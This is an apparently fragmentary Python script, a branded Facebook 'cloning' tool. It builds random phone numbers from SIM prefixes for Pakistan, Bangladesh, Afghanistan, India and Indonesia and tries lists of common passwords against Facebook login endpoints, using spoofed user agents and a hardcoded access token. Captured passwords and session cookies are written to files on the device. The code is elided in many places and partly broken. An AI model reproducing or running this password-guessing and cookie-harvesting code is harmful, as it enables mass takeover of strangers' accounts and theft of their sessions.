...
try:
    ...
    os.system('python R0M30.py')
try:
  import pycurl
except:
  os.system("pip install pycurl")
  import pycurl
os.system('xdg-open https://chat.whatsapp.com/Dt4wEVDwZTODnQsvcjbs2I')
...
def clr():
    try:
        ...
        if 'Android' in data:
            print(' \033[1;32m[!] DONT TRY AGAIN ITS R0M30 BRAND ');exit()
        else:exit()
    except:exit()
####### MODULES KILLER #######
...
device = {
        ...
        'fbca':fbca,
        'fbdm':fbdm}
os.system('xdg-open https://www.facebook.com/R0M30.arshad.56')
def ua_api():
...
\033[1;39m━▷ \033[0;91m𝙊𝙒𝙉𝙀𝙍    \033[1;39m◈✙◈\033[1;33m MR R0M30
\033[1;39m━▷ \033[0;92m𝙏𝙀𝘼𝙈     \033[1;39m◈✙◈\033[1;31m TEAM OF R0M30
\033[1;39m━▷ \033[0;93m𝙁𝘼𝘾𝙀𝘽𝙊𝙊𝙆 \033[1;39m◈✙◈ \033[1;33m R0M30
\033[1;39m━▷ \033[0;94m𝙁𝘽 𝙂𝙍𝙊𝙐𝙋 \033[1;39m◈✙◈ \033[1;34mFACEBOOK HELPING ZONE 
\033[1;39m━▷ \033[0;95m𝙎𝘼𝙏𝙐𝙏𝘼𝙎  \033[1;39m◈✙◈ \033[0;92mFREE ENJOY
\033[1;39m━▷ \033[0;97m𝙑𝙀𝙍𝙎𝙄𝙊𝙉  \033[1;39m◈✙◈ \033[1;33m 2.8
\033[1;39m━▷ \033[1;36m𝙁𝙀𝙀𝙇 𝙏𝙃𝙀 𝙋𝙊𝙒𝙀𝙍 𝙊𝙁 𝙔𝙊𝙐𝙍 𝘿𝘼𝘿 𝙍𝙊𝙈𝙀𝙊 𝙃𝙀𝙍𝙀 
\033[0;95m●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬●\033[1;37m๑۩♡۩๑\033[0;95m●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬●
...
def approval():
  ...
  try:
    ...
    if realid in httpCaht:
      ...
      print('\33[1;37m ====================================================')
      print (" \33[37;41m\t WELCOME TO R0M30 TOOL AND ENJOY \33[0;m")
      ...
      tks = ('Hello%20Sir%20!%20Please%20Approve%20My%20Token%20The%20Token%20Is%20:%20'+id);os.system('https://wa.me/+923049211464'+tks)
      sys.exit()
      time.sleep(1)
      approval()
               ...
               #chk()
                ...
                if x == ("***"):                	  
                        ...
                        if xd in ['1','01']:
                                ...
                                print(' PUT FILE EXAMPLE :  /sdcard/File.xyz.etc..')
                                linex()
                                ...
                                clear()
                                print(' [1] Rendom Pakistan cloning\n [2] Rendom Bangladesh cloning\n [3] Rendom Afghanistan cloning\n [4] Rendom India cloning\n [5] Rendom Indonesia cloning\n [0] Back menu')
                                linex()
                                x=input(' Choose: ')
                                if x in ['1','01']:
                                        pak()
...
def pak():
                user=[]
                clear()
                print('\033[1;33m CODE EXAMPLE : 0306,0315,0335,0345,......ETC')
                code = input('\033[1;31m PUT CODE: ')
                try:
                        limit = int(input('\033[0;92m EXAMPLE : 2000, 3000, 5000, 10000\n\033[1;37m PUT LIMIT : '))
                except ValueError:
                        limit = 5000
                for nmbr in range(limit):
                        nmp = ''.join(random.choice(string.digits) for _ in range(7))
                        user.append(nmp)
                with tred(max_workers=30) as R0M30:     
                        clear()
                        
                        tl = str(len(user))
                        print('[+] Total accounts: \033[1;93m'+tl)
                        print('[+] Select Sim code:\033[1;92m'+code)
                        print('[+] Process has been started \033[1;97m')
                        linex()
                        for psx in user:
                                ids = code+psx                               
                                passlist = [psx,ids,'khankhan','malik123','baloch123','pak123','khan123','khan12345','786787','baloch','pubg123','khan786','khan1122','khan1234','l love you']
                                R0M30.submit(rndm,ids,passlist)
                print('\033[1;37m')
                linex()
                print(' THE PROCESS HAS COMPLETED')
                print(' TOTAL OK/CP: '+str(len(oks))+'/'+str(len(cps)))
...
def bd():
                user=[]
                clear()
                print('\033[1;33m CODE EXAMPLE : 017,016,018,...etc')
                ...
                with tred(max_workers=30) as R0M30:     
                        ...
                        tl = str(len(user))
                        print('[+] Total accounts: \033[1;95m'+tl)
                        print('[+] Select Sim code:\033[1;92m'+code)
                        print('[+] Process has been started \033[1;97m')
                        linex()
                        for psx in user:
                                ids = code+psx                               
                                passlist = [psx,ids,'i love you','iloveyou','free fire','freefire','57273200','bangladesh','bangla123','bangladesh123']
                                R0M30.submit(rndm,ids,passlist)
                print('\033[1;37m')
                linex()
                print(' THE PROCESS HAS COMPLETED')
...
def afg():
                user=[]
                clear()
                print('\033[1;33m CODE EXAMPLE : 9377,9379,9374....etc')
                code = input('\033[1;37m PUT CODE: ')
                try:
                        limit = int(input('\033[0;92m EXAMPLE : 2000, 3000, 5000, 10000\n\033[1;37m PUT LIMIT : '))
                except ValueError:
                ...
                with tred(max_workers=30) as R0M30:     
                        ...
                        tl = str(len(user))
                        print('[+] Total accounts: \033[1;92m'+tl)
                        print('[+] Select Sim code:\033[1;95m'+code)
                        print('[+] Process has been started \033[1;97m')
                        linex()
                        for psx in user:
                                ids = code+psx
                                passlist = [psx,ids,'afghan','afghan12345','Afghan123','afghanistan','100200','kabul123','afghan1234','kabul1234','first8','last8','۱۳۳۳۵۶۷۸۹','۱۳۳۳۵۶']
                                R0M30.submit(rndm,ids,passlist)
                print('\033[1;37m')
                linex()
                print(' THE PROCESS HAS COMPLETED')
...
def ind():
                user=[]
                clear()
                print('\033[1;34m CODE EXAMPLE : 6355,6353,6383,9871,8795,...etc')
                code = input('\033[1;37m PUT CODE: ')
                try:
                        limit = int(input('\033[0;92m EXAMPLE : 2000, 3000, 5000, 10000\n\033[1;37m PUT LIMIT : '))
                except ValueError:
                ...
                with tred(max_workers=30) as R0M30:     
                        ...
                        for psx in user:
                                ids = code+psx
                                passlist = [psx,ids,'hindustan','free fire','Free Fire','i love you','freefire123','57273200','59039200','57575751']
                                R0M30.submit(rndm,ids,passlist)
                print('\033[1;37m')
                linex()
                print(' THE PROCESS HAS COMPLETED')
...
def indo():
                user=[]
                clear()
                print('\033[1;34m CODE EXAMPLE : 021,031,035,071,0411,etc')
                code = input('\033[1;37m PUT CODE: ')
                try:
                        limit = int(input('\033[0;92m EXAMPLE : 2000, 3000, 5000, 10000\n\033[1;37m PUT LIMIT : '))
                except ValueError:
...
def gmail():
                ...
                linex()
                print(' Example: @gmail.com , @yahoo.com , @hotmail.com etc...')
                linex()
                domain = input(' domain: ')
                linex()
                try:
...
def ffb(ids,names,passlist):
        try:
                ...
                sys.stdout.write('\r\r\033[1;37m[R0M30-XD-M1] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                ...
                for pw in passlist:
                        ...
                        ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";[FBAN/FB4A;FBAV/;FBBV/;[FBAN/FB4A;FBAV/196.0.0.87;FBBV/817598636;FBDM/{density=2.0,width=1280,height=1440};FBLC/en_AU;FBRV/665516135;FBCR/axis;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A500XZ;FBSV/7.2.2;FBOP/1;FBCA/armeabi-v7a:armeabi;]','[FBAN/FB4A;FBAV/;FBBV/;[FBAN/FB4A;FBAV/429.0.0.27.114;FBBV/637834541;FBDM/){density=2.0,width=720,height=1280};en_PK;FBRV/637834541;FBCR/Skitto;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/GT-1440;FBSV/5.1.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]','[FBAN/FB4A;FBAV/;FBBV/;[FBAN/FB4A;FBAV/308.0.0.42.118;FBBV/275987623;FBDM/{density=2.0,width=720,height=1280};FBLC/en_GB;FBRV/277740997;FBCR/Idea;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/Redmi_4;FBSV/7.1.2;FBOP/1;FBCA/armeabi-v7a:armeabi;]','[FBAN/FB4A;FBAV/196.0.0.34;FBBV/325783181;FBDM/{density=1.5,width=1280,height=1280};FBLC/si_LK;FBRV/0;FBCR/Claro AR;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/Redmi 5 Plus;FBSV/13.3.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]','[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748054;FBDM/{density=2.0,width=720,height=1280};FBLC/es_LA;FBCR/VIVA;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G7102;FBSV/4.4.2;nullFBCA/armeabi-v7a:armeabi;]','[FBAN/FB4A;FBAV/59.0.0.15.313;FBBV/20097190;FBDM/{density=1.5,width=540,height=960};FBLC/en_US;FBCR/Siminn;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A300FU;FBSV/5.0.2;nullFBCA/armeabi-v7a:armeabi;]','[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748054;FBDM/{density=2.0,width=720,height=1280};FBLC/es_LA;FBCR/VIVA;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G7102;FBSV/4.4.2;nullFBCA/armeabi-v7a:armeabi;]','[FBAN/FB4A;FBAV/44.0.0.1412;FBBV/4624530;[FBAN/FB4A;FBAV/406.0.0.26.90;FBBV/456153944;FBDM/{density=1.875,width=720,height=1465};FBLC/pt_BR;FBRV/457886897;FBCR/CLARO BR;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A035M;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]','[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748051;FBDM/{density=1.5,width=540,height=960};FBLC/en_US;FBCR/Jio 4G;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SGH-I257M;FBSV/4.4.2;nullFBCA/armeabi-v7a:armeabi;]','[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748051;FBDM/{density=1.5,width=540,height=960};FBLC/en_US;FBCR/OneCall;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SGH-C3312R;FBSV/4.4.2;nullFBCA/armeabi-v7a:armeabi;]','[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748051;FBDM/{density=1.5,width=540,height=960};FBLC/en_US;FBCR/Turkcell;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SGH-i9040;FBSV/4.4.2;nullFBCA/armeabi-v7a:armeabi;]"
                        ...
                        if 'session_key' in po:
                                        print('\r\r\033[1;32m[R0M30-XD-OK] '+ids+' [√] '+pas+'\033[1;97m'+' | '+Jawnx(uid)+' ')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        print("\r\r\033[1;32m [🍪Cookie:]"+coki)                                                                         
                                        open('/sdcard/R0M30-COOKIE.txt','a').write(ids+'|'+pas+ ' [√] ' +coki+'\n')
                                        open('/sdcard/R0M30-OK.txt','a').write(ids+'[√]'+pas+'\n')                                        
                                        oks.append(ids)                                     
                                        break
                        elif twf in str(po):
                                        if 'y' in pcp:
                                                print('\r\r \033[1;34m[R0M30-2F] '+ids+' [√] '+pas)
                                                twf.append(ids)
                                                break
                        elif 'www.facebook.com' in po['error']['message']:
                                        if 'y' in pcp:
                                                print('\r\r\x1b[1;31m [ALONE-R0M30-CP] '+ids+' [√] '+pas+'\033[1;97m'+' | '+Jawnx(uid)+' ')
                                                open('/sdcard/R0M30-CP.txt','a').write(ids+'[√]'+pas+'\n')
                                                break
                                                cps.append(ids)
                                        else:
                                                open('/sdcard/R0M30-CP.txt','a').write(ids+'[√]'+pas+'\n')
...
def api(ids,names,passlist):
        try:
                global ok,loop,sim_id
                sys.stdout.write('\r\r\033[1;37m [R0M30-XD-M2] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                ...
                for pw in passlist:
                        ...
                        if 'session_key' in po:
                                        print('\r\r\033[1;32m[R0M30-XD-OK] '+str(uid)+' [√] '+pas+'\033[1;97m'+' | '+Jawnx(uid)+' ')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        print("\r\r\033[1;33m [🍪Cookie: ]"+coki)                                                                             
                                        open('/sdcard/R0M30-COKIE.txt','a').write(str(uid)+'[√]'+pas+ ' | ' +coki+'\n')
                                        open('/sdcard/R0M30-OK.txt','a').write(str(uid)+'[√]'+pas+'\n')                                   
                                        oks.append(ids)                                       
                                        break
                        elif twf in str(po):
                                        if 'y' in pcp:
                                                print('\r\r \033[1;34m[R0M30-2F] '+ids+' [√] '+pas+' | '+Jawnx(uid)+' ')
                                                twf.append(ids)
                                                break
                        elif 'www.facebook.com' in po['error']['message']:
                                        if 'y' in pcp:
...
def api1(ids,names,passlist):
        global loop
        global oks
        sys.stdout.write('\r\r\033[1;37m [R0M30-XD-M3] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        try:
                for pas in passlist:
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
                        ...
                        if 'session_key' in po:
                                ...
                                if uid in oks:pass
                                        ...
                                        print('\r\r\x1b[1;31m [ALONE-R0M30-CP] '+str(uid)+' [√] '+pas+'\033[1;97m'+' | '+Jawnx(uid)+' ')
                                        open('/sdcard/R0M30-CP.txt','a').write(str(uid)+'[√]'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
...
def rndm(ids,passlist):
        global loop
        global oks
        sys.stdout.write('\r\r\033[1;37m [R0M30-XD] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        try:
                for pas in passlist:
                        accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        print("\r\r\033[1;33m [🍪Cookie:]"+coki)                                                                                                               
                                        open('/sdcard/R0M30-rnd-COKIE.txt','a').write(str(uid)+'|'+pas+ ' | ' +coki+'\n')
                                        open('/sdcard/R0M30-rnd-OK.txt','a').write(str(uid)+'|'+pas+'\n')                                   
                                        oks.append(str(uid))                                                   
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                try:
                                ...
                                if uid in oks:pass
                                        ...
                                        #print('\r\r\x1b[1;31m [ALONE-R0M30-CP] '+str(uid)+' | '+pas+'\033[1;97m'+Jawnx(uid)+' ')
                                        open('/sdcard/R0M30-rnd-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
